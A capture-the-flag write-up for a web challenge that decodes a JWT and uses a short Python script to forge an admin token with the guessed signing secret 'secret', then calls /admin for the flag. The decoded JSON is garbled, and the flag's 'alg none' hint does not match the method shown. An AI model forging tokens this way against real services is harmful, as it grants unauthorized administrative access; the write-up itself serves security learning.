# BCC CTF 2025 Write-up

## Web 

### Restricted Access: Last Race

login.html

![image](https://github.com/user-attachments/assets/c10590dc-45ef-4912-96e3-2fb6904f8d74)

Trying to login and see our JWT token in the request 

Where `Authorization:` 

![image](https://github.com/user-attachments/assets/48d318d1-a8a4-45ec-99c9-b05eb788dbde)

Decoding JWT

Token:

    eyJhbGciOiJIUUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTc0NTY1NjE0NH0.qaTho4a9cYzIWNPHSH2y7MKnw3Jwx9gFhv_rYIUmM-g

Header (first segment):

    {
      { “alg”: “HS256”,
      “typ": ”JWT”
    }

Payload (second segment):

    {
      “username": ‘test’,
      { “role”: { “user”,
      { “iat”: 1745656144
    }

We need to change role to admin `role: admin` and user to admin `user: admin`

This requires a signature with a secret. In your case the algorithm is HS256, so the signature is HMAC SHA-256 from base64url(header) + “.” + base64url(payload) with a secret.

Python script for JWT generartion

    import jwt
    
    secret = 'secret'
    
    payload = {
        "username": "admin",
        "role": "admin",
        "iat": 1745652446
    }
    
    token = jwt.encode(payload, secret, algorithm='HS256')
    print(token)

Our new token with admin role:

    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzQ1NjUyNDQ2fQ.oEeX973VqPxMXi8Kd2gVyq6WVzb_UsuAPZqaaq5TZMw

Change token in the request

    ...
    Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzQ1NjUyNDQ2fQ.oEeX973VqPxMXi8Kd2gVyq6WVzb_UsuAPZqaaq5TZMw
    ...

![image](https://github.com/user-attachments/assets/a3a6f563-e74a-4faf-bef5-cf327bfdfb47)

Request to `/admin`

![image](https://github.com/user-attachments/assets/1891248e-8e51-4e0f-ba83-1eb77096c879)

FLAG:

    BCC{4lg_n0n3_jw1_3xpl0i1}
